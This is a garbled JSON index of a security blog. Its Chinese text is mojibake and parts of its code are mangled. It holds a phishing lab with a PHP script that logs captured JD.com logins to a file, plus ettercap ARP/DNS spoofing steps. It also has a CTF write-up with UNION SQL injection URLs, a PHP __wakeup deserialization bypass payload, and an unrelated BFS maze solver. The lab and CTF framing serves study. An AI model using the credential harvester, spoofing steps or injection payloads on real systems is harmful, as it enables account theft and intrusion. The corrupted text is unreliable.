\"æ‚¨å·²æ•è·äº¬ä¸œè´¦å·åŠå¯†ç 1ä¸ªï¼š\" . \" ç”¨æˆ·å \" . $nam . \" å¯†ç  \" . $pas; //ä¿å­˜æ•è·çš„ç”¨æˆ·åå’Œå¯†ç $filed = @fopen(\"1.txt\", \"a+\"); //æ‰“å¼€1.txt@fwrite($filed, \"$content\\n\"); //å°†ç”¨æˆ·åå’Œå¯†ç å†™å…¥1.txt?&gt;&lt;html&gt;&lt;head&gt;&lt;script type=\"text/javascript\"&gt; function goBack() &#123; window.history.back() //åé€€+åˆ·æ–° &#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=\"goBack()\"&gt; &lt;!-- åŠ è½½ä¹‹åç«‹å³æ‰§è¡Œä¸€æ®µ JavaScript --&gt;&lt;/body&gt;&lt;/html&gt; 4.å®éªŒæ‹“æ‰‘å›¾ å®éªŒæ­¥éª¤ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨1.å®‰è£…DNSå’ŒwebæœåŠ¡å™¨ï¼ˆå…·ä½“æ­¥éª¤ç•¥ï¼‰2.é…ç½®DNSæœåŠ¡å™¨a.åœ¨æ­£å‘è§£æä¸­å»ºä¸€ä¸ªåŒºåŸŸåå­—ä¸ºjd ipä¸ºæœåŠ¡å™¨åœ°å€ï¼ˆ10.1.1.1ï¼‰b.åœ¨jdåŸŸä¸­æ–°å»ºä¸€å°ä¸»æœº www.jd.com ip:10.1.1.1 2.IISa.å°†é»˜è®¤ç½‘ç«™åœæ­¢b.æ–°å»ºç½‘ç«™jd.com,æ–‡ä»¶è·¯å¾„ä¸ºä¿å­˜çš„jdç½‘é¡µc.æ‰“å¼€webæœåŠ¡ä¸­çš„aspï¼ˆå› ä¸ºæ­¤ç½‘ç«™ä¸æ˜¯é™æ€ç½‘ç«™ï¼‰ï¼ˆä½¿ç”¨2003å®¢æˆ·æœºè®¿é—®www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰ äºŒ.éƒ¨ç½²kali1.å°†é’“é±¼ç½‘é¡µçš„æ‰€æœ‰æ–‡ä»¶æ”¾åˆ° kali çš„/var/www/html/è·¯å¾„ä¸‹ï¼Œ å¹¶ä¿®æ”¹ 1.txt çš„æƒé™ï¼Œ ä½¿è¿™ä¸ªæ–‡æ¡£å¯ä»¥å†™å…¥æ•°æ®ã€‚2.å¼€å¯apacheæœåŠ¡ï¼Œå¹¶æ£€æŸ¥80ç«¯å£æ˜¯å¦å·²å¼€å¯systemctl start apache2netstat -antpl3.ä¿®æ”¹DNSæ¬ºéª—é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œ å‘½ä»¤ï¼švim /etc/ettercap/etter.dnsï¼Œç„¶å æ·»åŠ ä¸€æ¡ A è®°å½•ï¼Œæ·»åŠ ä¸€æ¡ PTR è®°å½•ï¼Œä½¿ç”¨æˆ·è®¿é—®ä»»ä½•ç½‘é¡µï¼Œå…¨éƒ¨æŒ‡å‘ä¸º10.1.1.2 é€‰ä¸­ä¸€è¡Œåï¼ŒæŒ‰ä¸¤æ¬¡då¯åˆ é™¤å†…å®¹æƒ³è¦ç¼–è¾‘æ—¶ï¼Œå…ˆæŒ‰i(insert)ç¼–è¾‘ç»“æŸå :wq ä¿å­˜4.æ‰“å¼€ettercapè½¯ä»¶5.é€‰æ‹©sniffâ€“unified sniffingï¼Œå¹¶é€‰æ‹©ç›‘å¬eth06.ç„¶åé€‰æ‹©Hostsâ€”â€”Scan for hostsâ€“æ‰«æå®Œæˆåé€‰æ‹©Hostsâ€”â€”Hosts list,å¯ä»¥çœ‹åˆ°æ‰«æåˆ°çš„ä¸»æœº7.æ·»åŠ æ¬ºéª—è®°å½•é€‰ä¸­10.1.1.1ï¼Œç‚¹å‡»Add to Target 1 é€‰ä¸­10.1.1.3ï¼Œç‚¹å‡»Add to Target 28.åœ¨Mitmé€‰æ‹©ARPæ¬ºéª—åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬ä¸€ä¸ªç‚¹å‡»ç¡®å®š9.é€‰æ‹©plugins â€“ Manage the pluginsï¼Œå‡†å¤‡è¿›è¡ŒDNSæ¬ºéª—åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œ æ‰¾åˆ° dns spoof å¹¶åŒå‡»å‡ºç°*å·ï¼Œå¼€å§‹DNSæ¬ºéª— ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢1.åœ¨å®¢æˆ·æœºä¸­åœ¨ä¸­ï¼Œå†æ¬¡ç™»å½•www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç ç­‰ï¼Œå¦‚å›¾ï¼Œç„¶åç‚¹å‡»ç™»å½•2.åœ¨kaliè™šæ‹Ÿæœºä¸­ï¼Œå·²ç»é’“é±¼æˆåŠŸï¼Œå¹¶é’“åˆ°äº¬ä¸œçš„ç™»å½•è´¦æˆ·åŠå¯†ç (cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook é¢˜ç›®æç¤ºï¼šThis guestbook sucks. sqlmap is your friend. æ˜¯sqlæ³¨å…¥ç‚¹å‡»Message List æ—¶æ˜¯ç©ºçš„ï¼Œ ç‚¹å‡»postæ˜¯å¯ä»¥æäº¤æ–°ä¿¡æ¯ï¼Œç‚¹å‡»æŸ¥çœ‹æ–°ä¿¡æ¯ åœ¨idå€¼ååŠ ä¸Šâ€ â€˜ â€œæµ‹è¯•æ˜¯å¦å­˜åœ¨æµ‹è¯•ç‚¹ç½‘é¡µæŠ¥é”™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹union æ³¨å…¥!æŸ¥çœ‹åˆ— 12https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20#//id=-1 æ˜¯è®©å‰é¢çš„å†…å®¹ä¸æ˜¾ç¤º 3è¢«å›æ˜¾ 1.æŸ¥çœ‹æ•°æ®åº“å 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# æ•°æ®åº“çš„åå­—g8 2.æŸ¥çœ‹è¡¨å 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# å‘ç°æœ‰ä¸€ä¸ªè¡¨ flag 3.æµ‹è¯•è¡¨çš„å­—æ®µ 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='flag' limit 1,1),4# ä»ç„¶æ˜¾ç¤ºflag 4.è¯»å–flag 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# å¾—åˆ°flag!","tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"ååºåˆ—åŒ–","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/phpååºåˆ—åŒ–/","text":"ååºåˆ—åŒ– PHPé­”æœ¯æ–¹æ³•_ wakeup()æ˜¯åœ¨ååºåˆ—åŒ–æ“ä½œä¸­èµ·ä½œç”¨çš„é­”æ³•å‡½æ•°ï¼Œ å½“unserializeçš„æ—¶å€™ï¼Œ ä¼šæ£€æŸ¥æ—¶å€™å­˜åœ¨ __ wakeup()å‡½æ•°, å¦‚æœå­˜åœ¨çš„è¯ï¼Œä¼šä¼˜å…ˆè°ƒç”¨__wakeup()å‡½æ•°ã€‚ è€Œwakeup()å‡½æ•°æ¼æ´å°±æ˜¯ä¸å¯¹è±¡çš„å±æ€§ä¸ªæ•°æœ‰å…³ï¼Œå¦‚æœåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå±æ€§ä¸ªæ•°çš„æ•°å­—ä¸çœŸå®å±æ€§ä¸ªæ•°ä¸€è‡´ï¼Œé‚£ä¹ˆå°±è°ƒç”¨wakeup()å‡½æ•°, å¦‚æœè¯¥æ•°å­—å¤§äºçœŸå®å±æ€§ä¸ªæ•°ï¼Œå°±ä¼šç»•è¿‡__wakeup()å‡½æ•°ã€‚ serialize()å‡½æ•°ï¼šç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–å¯¹è±¡åï¼Œ å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚ unserialize()å‡½æ•°ï¼šç”¨äºå°†é€šè¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„ã€‚ ä¸¾ä¾‹è¯´æ˜ &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}å„ä¸ªç¬¦å·çš„å«ä¹‰å˜é‡ç±»å‹ï¼šç±»åé•¿åº¦ï¼ˆå­—èŠ‚ï¼‰ï¼šç±»åï¼šå±æ€§æ•°é‡ï¼š{å±æ€§åç±»å‹ï¼šå±æ€§åé•¿åº¦ï¼šå±æ€§åï¼šå±æ€§å€¼ç±»å‹ï¼šå±æ€§å€¼é•¿åº¦ï¼šå±æ€§å€¼å†…å®¹} å…¶ä¸­åœ¨Stuedentç±»åé¢æœ‰ä¸€ä¸ªæ•°å­—3ï¼Œæ•´ä¸ª3è¡¨ç¤ºçš„å°±æ˜¯Studentç±»å­˜åœ¨3ä¸ªå±æ€§ã€‚wakeup()æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚ å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ä¿®æ”¹ä¸º5ï¼Œå˜ä¸ºO:7:â€Studentâ€:5:{s:9:â€full_nameâ€;s:8:â€zhangsanâ€;s:5:â€scoreâ€;i:150;s:6:â€gradesâ€;a:0:{}} æœ€åæ‰§è¡Œè¿è¡Œçš„ä»£ç å¦‚ä¸‹: 1234567891011121314151617&lt;?phpclass Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo \"__wakeup is invoked\";&#125;function __destruct() &#123;var_dump($this);&#125;&#125;$s = new Student();$stu = unserialize('O:7:\"Student\":5:&#123;s:9:\"full_name\";s:8:\"zhangsan\";s:5:\"score\";i:150;s:6:\"grades\";a:0:&#123;&#125;&#125;');?&gt; ä¸¾ä¾‹è¯´æ˜é¢˜ç›® 123456class xctf&#123;public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= 12345678910&lt;?phpclass xctf&#123; //å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»public $flag = '111';//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111public function __wakeup()&#123; //å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬exit('bad requests');&#125;&#125;$test = new xctf(); //ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸ºtestecho(serialize($test)); //è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆtestï¼‰?&gt; è¾“å‡ºç»“æœ O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}æˆ‘ä»¬è¦ååºåˆ—åŒ–xctfç±»çš„åŒæ—¶è¿˜è¦ç»•è¿‡wakeupæ–¹æ³•çš„æ‰§è¡Œï¼ˆå¦‚æœä¸ç»•è¿‡wakeup()æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šè¾“å‡ºbad requestså¹¶é€€å‡ºè„šæœ¬ï¼‰ï¼Œwakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚å› æ­¤ï¼Œéœ€è¦ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°ï¼šå½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ç”±çœŸå®å€¼1ä¿®æ”¹ä¸º2ï¼Œå³å¦‚ä¸‹æ‰€ç¤ºï¼š O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}è®¿é—®url?code=O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"è¿·å®«é—®é¢˜","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/è¿·å®«é—®é¢˜/","text":"è¿·å®«é—®é¢˜ åŸé¢˜é¢˜ç›®æè¿° å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚ å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚ è¾“å…¥ è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚ æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚ æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚ å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼šâ€˜Sâ€™ï¼šèµ·ç‚¹â€˜Eâ€™ï¼šç»ˆç‚¹â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡ è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚ è¾“å‡º å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚ æ ·ä¾‹è¾“å…¥1 5 5 s-### ----- ##--- E#--- ---##æ ·ä¾‹è¾“å‡º9è§£å†³ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;string&gt;#include&lt;queue&gt;#include &lt;algorithm&gt;using namespace std;int de[100][100];//è®¡æ­¥æ•°ç»„ è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 char map[100][100]; //ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ typedef pair&lt;int,intP; //åæ ‡int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘int sx,ex,sy,ey; //(sx,sy)ä¸ºèµ·ç‚¹åæ ‡ ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡int x,y,nx,ny; //(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡ ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ int r,l; //rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° int bfs()&#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //å–å‡ºé˜Ÿå¤´åæ ‡ qu.pop() ;//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯ for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ° æ’é™¤èµ°è¿‡çš„è·¯ &#123; qu.push(P(nx,ny)); //å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ de[nx][ny]=de[x][y]+1; //æ­¥æ•°åŠ ä¸€ &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ else return de[ex][ey]; &#125; int main()&#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //è®°å½•èµ·ç‚¹åæ ‡ &#123; sx=i,sy=j; &#125; else if(map[i][j]=='E') //è®°å½•ç»ˆç‚¹åæ ‡ &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0;&#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]